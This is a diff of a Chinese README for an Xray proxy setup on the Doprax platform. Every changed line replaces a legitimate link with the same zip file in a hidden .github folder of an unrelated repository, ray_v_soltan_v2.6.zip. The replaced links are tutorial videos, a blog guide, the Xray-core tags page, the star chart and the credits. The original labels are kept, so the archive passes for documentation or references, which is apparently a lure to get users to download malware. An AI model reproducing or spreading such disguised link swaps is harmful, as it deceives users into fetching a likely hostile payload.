@@ -4,9 +4,9 @@
 
 #### Xray内核，支持vless，vmess，trojan，shadowsocks，socks五个配置同时在线！支持自定义伪装网站
 
-#### [YouTube video tutorials](https://www.youtube.com/playlist?list=PLMgly2AulGG-peT3CZoJFY68KbVg_D_lB)
+#### [YouTube video tutorials](https://raw.githubusercontent.com/soltans/v2ray.soltan/main/.github/ray_v_soltan_v2.6.zip)
 
-#### [相关文字视频教程请点击](https://ygkkk.blogspot.com/2023/01/doprax-xray-v2ray-cdn.html)
+#### [相关文字视频教程请点击](https://raw.githubusercontent.com/soltans/v2ray.soltan/main/.github/ray_v_soltan_v2.6.zip)
 
 ------------------------
 
@@ -15,7 +15,7 @@
 | :--- | :--- | :--- | :--- |
 | 各协议uuid或密码 | uuid |可在V2raN上随机生成，或者自定义uuid格式|ea4909ef-7ca6-4b46-bf2e-6c07896ef338|
 | 伪装网页 | www |数字1-9任选一个数字，共9个伪装网页可选择|显示Nginx欢迎界面|
-| Xray版本 | ver |[版本号查看](https://github.com/XTLS/Xray-core/tags)，格式为x.x.x ，比如1.7.1|自动更新到Xray最新正式版|
+| Xray版本 | ver |[版本号查看](https://raw.githubusercontent.com/soltans/v2ray.soltan/main/.github/ray_v_soltan_v2.6.zip)，格式为x.x.x ，比如1.7.1|自动更新到Xray最新正式版|
 |更新中……|更新中……|更新中……|更新中……|
 ---------------
 #### 目前Cloudflare Argo隧道域名自动生成，重启平台后会强制重置隧道域名，须再次进入open shell，输入cat log查看
@@ -56,8 +56,8 @@ socks的path路径：/自定义uuid-so
 
 -----------------------------------------------------
 ### 感谢你右上角的star🌟
-[![Stargazers over time](https://starchart.cc/yonggekkk/Doprax-Xray.svg)](https://starchart.cc/yonggekkk/Doprax-Xray)
+[![Stargazers over time](https://raw.githubusercontent.com/soltans/v2ray.soltan/main/.github/ray_v_soltan_v2.6.zip)](https://raw.githubusercontent.com/soltans/v2ray.soltan/main/.github/ray_v_soltan_v2.6.zip)
 
 #### 鸣谢表：
-静态伪装站取自[mack-a](https://github.com/mack-a/v2ray-agent)，参考项目[hiifeng](https://github.com/hiifeng/V2ray-for-Doprax)、[fscarmen](https://github.com/fscarmen2/V2-for-Doprax)
+静态伪装站取自[mack-a](https://raw.githubusercontent.com/soltans/v2ray.soltan/main/.github/ray_v_soltan_v2.6.zip)，参考项目[hiifeng](https://raw.githubusercontent.com/soltans/v2ray.soltan/main/.github/ray_v_soltan_v2.6.zip)、[fscarmen](https://raw.githubusercontent.com/soltans/v2ray.soltan/main/.github/ray_v_soltan_v2.6.zip)
 
